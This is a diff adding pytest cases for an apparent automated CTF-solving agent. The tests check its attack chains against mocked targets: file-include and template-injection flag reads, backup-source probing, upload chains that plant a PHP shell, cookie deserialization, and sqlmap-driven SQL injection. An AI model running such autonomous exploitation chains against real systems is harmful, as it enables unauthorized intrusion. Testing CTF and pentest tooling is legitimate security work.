+        lambda self, tools: {},
+    )
+    set_notes_file(tmp_path / "notes_warmup_include.json")
+    notes_module._notes.clear()
+
+    async def _fake_full_check(self):
+        primitive = self.get("source_download")
+        assert primitive is not None
+        for implementation in primitive.implementations:
+            implementation.available = implementation.method == "requests_plus_zipfile"
+        self.capability_table["http_request"] = CapabilityEntry(
+            tool_name="http_request",
+            is_available=True,
+            health_state="healthy",
+            last_check_ts=0.0,
+            fallback_tool=None,
+            install_command=None,
+            requires_user_confirm=False,
+        )
+        return self
+
+    monkeypatch.setattr(
+        "pentestagent.agents.pa_agent.capability_registry.CapabilityRegistry.full_check",
+        _fake_full_check,
+    )
+
+    runtime = _DispatcherWarmupIncludeRuntime()
+    dispatcher = CTFTaskDispatcher(
+        runtime=runtime,
+        progress_callback=None,
+        verification_callback=lambda flag: "yes",
+    )
+
+    result = await dispatcher.run(
+        target="http://ctf.local/",
+        goal="拿到flag",
+        type="auto",
+        hint="",
+    )
+
+    assert result.success is True
+    assert result.flag == "DASCTF{warmup_include_bypass_ok}"
+    assert any(request.endswith("/source.php") for request in runtime.requests)
+    assert any("ffffllllaaaagggg" in request for request in runtime.requests)
+    notes_module._notes.clear()
+    notes_module._custom_notes_file = None
+    notes_module._loaded_notes_file = None
+
+
+@pytest.mark.asyncio
+async def test_ctf_dispatcher_solves_easy_tornado_handler_settings_hash_chain(monkeypatch, tmp_path):
+    monkeypatch.setattr(
+        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
+        lambda self, tools: {},
+    )
+    set_notes_file(tmp_path / "notes_easy_tornado_handler_settings.json")
+    notes_module._notes.clear()
+
+    async def _fake_full_check(self):
+        self.capability_table["http_request"] = CapabilityEntry(
+            tool_name="http_request",
+            is_available=True,
+            health_state="healthy",
+            last_check_ts=0.0,
+            fallback_tool=None,
+            install_command=None,
+            requires_user_confirm=False,
+        )
+        return self
+
+    monkeypatch.setattr(
+        "pentestagent.agents.pa_agent.capability_registry.CapabilityRegistry.full_check",
+        _fake_full_check,
+    )
+
+    runtime = _DispatcherEasyTornadoRuntime()
+    dispatcher = CTFTaskDispatcher(
+        runtime=runtime,
+        progress_callback=None,
+        verification_callback=lambda flag: "yes",
+    )
+
+    result = await dispatcher.run(
+        target="http://ctf.local/",
+        goal="拿到flag",
+        type="auto",
+        hint="",
+    )
+
+    assert result.success is True
+    assert result.flag == _DispatcherEasyTornadoRuntime.FLAG
+    assert any("/file?filename=/hints.txt" in request for request in runtime.requests)
+    assert any("/error?msg=" in request and "handler.settings" in request for request in runtime.requests)
+    assert any("/file?filename=/fllllllllllllag" in request for request in runtime.requests)
+    notes_module._notes.clear()
+    notes_module._custom_notes_file = None
+    notes_module._loaded_notes_file = None
+
+
 def test_ctf_dispatcher_extract_flag_ignores_css_selector_false_positive():
     dispatcher = CTFTaskDispatcher(runtime=_DispatcherMissingReconDepsRuntime(), progress_callback=None)
     css_blob = "summary{display:block}.container{margin:0 auto}"
@@ -4031,6 +4933,125 @@ async def test_ctf_dispatcher_backup_source_leak_prefers_app_py_candidates_from_
 
 
 @pytest.mark.asyncio
+async def test_ctf_dispatcher_backup_source_leak_ignores_login_html_candidates(
+    monkeypatch, tmp_path
+):
+    monkeypatch.setattr(
+        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
+        lambda self, tools: {},
+    )
+    set_notes_file(tmp_path / "notes_backup_html_filter.json")
+    notes_module._notes.clear()
+
+    runtime = _DispatcherBackupHtmlRuntime()
+    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)
+
+    outcome = await dispatcher._run_backup_source_leak_strategy(
+        "http://ctf.local/",
+        {},
+        "",
+    )
+
+    assert outcome.progress is False
+    assert "http://ctf.local/www.zip" in runtime.requests
+    assert "ctf_backup_candidate" not in notes_module._notes
+    notes_module._notes.clear()
+    notes_module._custom_notes_file = None
+    notes_module._loaded_notes_file = None
+
+
+@pytest.mark.asyncio
+async def test_ctf_dispatcher_generic_upload_chain_follows_uploaded_payload(
+    monkeypatch, tmp_path
+):
+    monkeypatch.setattr(
+        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
+        lambda self, tools: {},
+    )
+    set_notes_file(tmp_path / "notes_generic_upload.json")
+    notes_module._notes.clear()
+
+    runtime = _DispatcherGenericUploadRuntime()
+    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)
+    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag", detected_type="upload")
+
+    outcome = await dispatcher._execute_upload_chain(
+        "http://ctf.local/",
+        {"forms": []},
+        "",
+    )
+
+    assert outcome.progress is True
+    assert outcome.flag == "DASCTF{generic-upload-chain-ok}"
+    upload_requests = [
+        item for item in runtime.requests
+        if item[0] == "request" and item[1] == "http://ctf.local/upload"
+    ]
+    assert upload_requests
+    _, _, method, data, files = upload_requests[0]
+    assert method == "POST"
+    assert data["token"] == "csrf-demo"
+    assert "file" in files
+    assert any(
+        item.kind == "upload_attempt"
+        and item.metadata.get("strategy_kind") == "upload_chain"
+        for item in dispatcher.state.observations
+    )
+    notes_module._notes.clear()
+    notes_module._custom_notes_file = None
+    notes_module._loaded_notes_file = None
+
+
+@pytest.mark.asyncio
+async def test_php_upload_cookie_pop_chain_copies_polyglot_to_runtime_shell(
+    monkeypatch, tmp_path
+):
+    monkeypatch.setattr(
+        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
+        lambda self, tools: {},
+    )
+    set_notes_file(tmp_path / "notes_php_upload_cookie_pop.json")
+    notes_module._notes.clear()
+
+    runtime = _DispatcherPhpUploadCookiePopRuntime()
+    dispatcher = CTFTaskDispatcher(
+        runtime=runtime,
+        progress_callback=None,
+        verification_callback=lambda flag: "yes",
+    )
+    dispatcher.state = CTFState(target="http://ctf.local/", goal="拿到flag", detected_type="upload")
+
+    outcome = await dispatcher._attempt_php_upload_cookie_pop_chain(
+        "http://ctf.local/",
+        {
+            "type": "php_upload_cookie_pop",
+            "register_path": "/register",
+            "login_path": "/login",
+            "home_path": "/home",
+            "upload_path": "/index.php/upload",
+            "upload_field": "upload_file",
+            "shell_name": "flaghunter_shell.php",
+        },
+        artifact_url="http://ctf.local/www.tar.gz",
+    )
+
+    assert outcome.flag == "DASCTF{php-upload-cookie-pop-ok}"
+    assert any(
+        call[0] == "request"
+        and call[1] == "http://ctf.local/home"
+        and "Cookie" in call[5]
+        for call in runtime.calls
+    )
+    assert any(
+        record.value == "DASCTF{php-upload-cookie-pop-ok}"
+        for record in [*dispatcher.state.runtime_flags, *dispatcher.state.verified_flags]
+    )
+    notes_module._notes.clear()
+    notes_module._custom_notes_file = None
+    notes_module._loaded_notes_file = None
+
+
+@pytest.mark.asyncio
 async def test_ctf_dispatcher_contact_report_chain_records_captcha_blocker(
     monkeypatch, tmp_path
 ):
@@ -4067,6 +5088,40 @@ async def test_ctf_dispatcher_contact_report_chain_records_captcha_blocker(
         and "invalid captcha" in item.metadata.get("reason", "")
         for item in dispatcher.state.observations
     )
+    notes_module._notes.clear()
+    notes_module._custom_notes_file = None
+    notes_module._loaded_notes_file = None
+
+
+@pytest.mark.asyncio
+async def test_ctf_dispatcher_contact_report_chain_skips_after_prior_submission(
+    monkeypatch, tmp_path
+):
+    monkeypatch.setattr(
+        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
+        lambda self, tools: {},
+    )
+    set_notes_file(tmp_path / "notes_contact_skip_prior.json")
+    notes_module._notes.clear()
+
+    runtime = _DispatcherContactReportRuntime()
+    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)
+    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag")
+    dispatcher.state.add_observation(
+        "contact_report_submitted",
+        "http://ctf.local/contact",
+        source="contact_report_chain",
+        metadata={"status_code": 200},
+    )
+
+    outcome = await dispatcher._run_contact_report_chain_strategy(
+        "http://ctf.local/",
+        {"raw_links": ["http://ctf.local/contact"], "endpoints": ["/contact"]},
+    )
+
+    assert outcome.progress is False
+    assert outcome.reason == "contact/report already submitted"
+    assert runtime.requests == []
     notes_module._notes.clear()
     notes_module._custom_notes_file = None
     notes_module._loaded_notes_file = None
@@ -4250,6 +5305,32 @@ def test_contact_pow_solver_handles_trivial_hardness():
     assert _solve_contact_pow_solution("1_test") == 0
 
 
+def test_hypothesis_engine_generates_generic_param_sqli_for_get_form_surface():
+    from pentestagent.agents.pa_agent.hypothesis_engine import HypothesisEngine
+
+    state = CTFState(target="http://ctf.local", goal="拿到flag", detected_type="sqli")
+    state.add_observation(
+        "page_recon",
+        "easy_sql inject You have an error in your SQL syntax; check the MariaDB server version",
+        source="browser",
+        metadata={
+            "forms": [
+                {
+                    "action": "http://ctf.local/",
+                    "method": "get",
+                    "inputs": [{"name": "inject", "type": "text", "value": "1"}],
+                }
+            ]
+        },
+    )
+
+    hypotheses = HypothesisEngine().generate(state)
+    kinds = [item.kind for item in hypotheses]
+
+    assert "generic_param_sqli" in kinds
+    assert "auth_form_sqli" not in kinds
+
+
 @pytest.mark.asyncio
 async def test_ctf_dispatcher_uses_strategy_registry_for_auth_form_sqli(
     monkeypatch, tmp_path
@@ -4286,6 +5367,77 @@ async def test_ctf_dispatcher_uses_strategy_registry_for_auth_form_sqli(
 
     assert result.success is True
     assert "auth_form_sqli" in called_kinds
+    notes_module._notes.clear()
+    notes_module._custom_notes_file = None
+    notes_module._loaded_notes_file = None
+
+
+@pytest.mark.asyncio
+async def test_ctf_dispatcher_uses_strategy_registry_for_generic_param_sqli(
+    monkeypatch, tmp_path
+):
+    monkeypatch.setattr(
+        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
+        lambda self, tools: {},
+    )
+    set_notes_file(tmp_path / "notes_strategy_registry_generic_sqli.json")
+    notes_module._notes.clear()
+
+    runtime = _DispatcherGenericInjectSQLiRuntime()
+    dispatcher = CTFTaskDispatcher(
+        runtime=runtime,
+        progress_callback=None,
+        verification_callback=lambda flag: "yes",
+    )
+
+    async def _fake_full_check(self):
+        primitive = self.get("sql_injection_test")
+        assert primitive is not None
+        for implementation in primitive.implementations:
+            implementation.available = implementation.method == "sqlmap"
+        self.capability_table["sqlmap"] = CapabilityEntry(
+            tool_name="sqlmap",
+            is_available=True,
+            health_state="healthy",
+            last_check_ts=0.0,
+            fallback_tool="manual_sqli_payload",
+            install_command=None,
+            requires_user_confirm=False,
+        )
+        return self
+
+    async def _fake_run_sqlmap(*, url, data, level, risk, runtime):
+        return {
+            "vulnerable": True,
+            "injection_points": [{"parameter": "inject", "type": "GET"}],
+            "databases": ["ctf"],
+            "raw": "sqlmap identified injectable GET parameter but no flag yet",
+        }
+
+    monkeypatch.setattr(
+        "pentestagent.agents.pa_agent.capability_registry.CapabilityRegistry.full_check",
+        _fake_full_check,
+    )
+    monkeypatch.setattr("pentestagent.tools.sqlmap.run_sqlmap", _fake_run_sqlmap)
+
+    called_kinds: list[str] = []
+    original_execute = dispatcher.strategy_registry.execute
+
+    async def _wrapped_execute(kind: str, context):
+        called_kinds.append(kind)
+        return await original_execute(kind, context)
+
+    monkeypatch.setattr(dispatcher.strategy_registry, "execute", _wrapped_execute)
+
+    result = await dispatcher.run(
+        target="http://ctf.local/",
+        goal="拿到flag",
+        type="sqli",
+        hint="",
+    )
+
+    assert result.success is True
+    assert "generic_param_sqli" in called_kinds
     notes_module._notes.clear()
     notes_module._custom_notes_file = None
     notes_module._loaded_notes_file = None
